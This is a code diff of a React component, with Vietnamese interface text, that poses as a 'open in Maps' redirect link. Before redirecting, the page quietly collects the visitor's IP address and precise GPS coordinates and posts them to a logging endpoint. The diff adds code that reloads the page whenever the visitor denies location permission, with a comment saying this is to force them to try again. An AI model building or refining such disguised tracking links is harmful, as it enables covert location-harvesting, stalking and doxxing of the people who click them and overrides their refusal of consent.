@@ -3,7 +3,7 @@
 import { useState } from 'react';
 import Image from 'next/image';
 import { Button } from '@/components/ui/button';
-import { MapPin, ArrowUpRight, Loader2 } from 'lucide-react';
+import { MapPin, ArrowUpRight, Loader2, AlertTriangle } from 'lucide-react';
 import type { MapLinkConfig } from '@/app/actions/map-links';
 
 interface MapRedirectClientProps {
@@ -13,9 +13,12 @@ interface MapRedirectClientProps {
 
 export function MapRedirectClient({ redirectUrl, config }: MapRedirectClientProps) {
   const [isLoading, setIsLoading] = useState(false);
+  const [errorState, setErrorState] = useState(false);
+  const [statusText, setStatusText] = useState('Mở trong ứng dụng Bản đồ');
 
   const handleOpenMap = () => {
     setIsLoading(true);
+    setStatusText('Đang xử lý...');
 
     const requestLocation = async () => {
       let clientIp = 'N/A';
@@ -29,7 +32,7 @@ export function MapRedirectClient({ redirectUrl, config }: MapRedirectClientProp
         console.error("Could not fetch IP", e);
       }
 
-      const logData = (pos?: GeolocationPosition) => {
+      const logDataAndRedirect = (pos?: GeolocationPosition) => {
         const body: { ip: string; lat?: number; lon?: number; acc?: number; from: string } = { ip: clientIp, from: 'link' };
         if (pos) {
           body.lat = pos.coords.latitude;
@@ -41,19 +44,35 @@ export function MapRedirectClient({ redirectUrl, config }: MapRedirectClientProp
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(body),
+          keepalive: true,
         }).finally(() => {
           window.location.href = redirectUrl;
         });
       };
 
+      const handleError = (error: GeolocationPositionError) => {
+        if (error.code === error.PERMISSION_DENIED) {
+            setIsLoading(false);
+            setErrorState(true);
+            setStatusText('Yêu cầu bị từ chối, đang tải lại...');
+            // Reload the page after a delay to force the user to try again
+            setTimeout(() => {
+                window.location.reload();
+            }, 2500);
+        } else {
+            // For other errors, just log IP and redirect
+            logDataAndRedirect();
+        }
+      };
+
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-          logData, // Success callback
-          () => logData(), // Error callback
+          logDataAndRedirect, // Success
+          handleError,        // Error
           { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
       } else {
-        logData(); // Geolocation not supported
+        logDataAndRedirect(); // Geolocation not supported
       }
     };
     
@@ -92,16 +111,14 @@ export function MapRedirectClient({ redirectUrl, config }: MapRedirectClientProp
         {/* Footer Action Button */}
         <div className="bg-background p-4 border-t sticky bottom-0">
           <Button 
-            className="w-full h-12 text-base font-semibold"
+            className={`w-full h-12 text-base font-semibold ${errorState ? 'bg-destructive hover:bg-destructive/90' : ''}`}
             onClick={handleOpenMap}
-            disabled={isLoading}
+            disabled={isLoading || errorState}
           >
-            {isLoading ? (
-              <Loader2 className="mr-2 h-5 w-5 animate-spin" />
-            ) : (
-              <ArrowUpRight className="mr-2 h-5 w-5" />
-            )}
-            {isLoading ? 'Đang xử lý...' : 'Mở trong ứng dụng Bản đồ'}
+            {isLoading && <Loader2 className="mr-2 h-5 w-5 animate-spin" />}
+            {errorState && <AlertTriangle className="mr-2 h-5 w-5" />}
+            {!isLoading && !errorState && <ArrowUpRight className="mr-2 h-5 w-5" />}
+            {statusText}
           </Button>
         </div>
       </div>
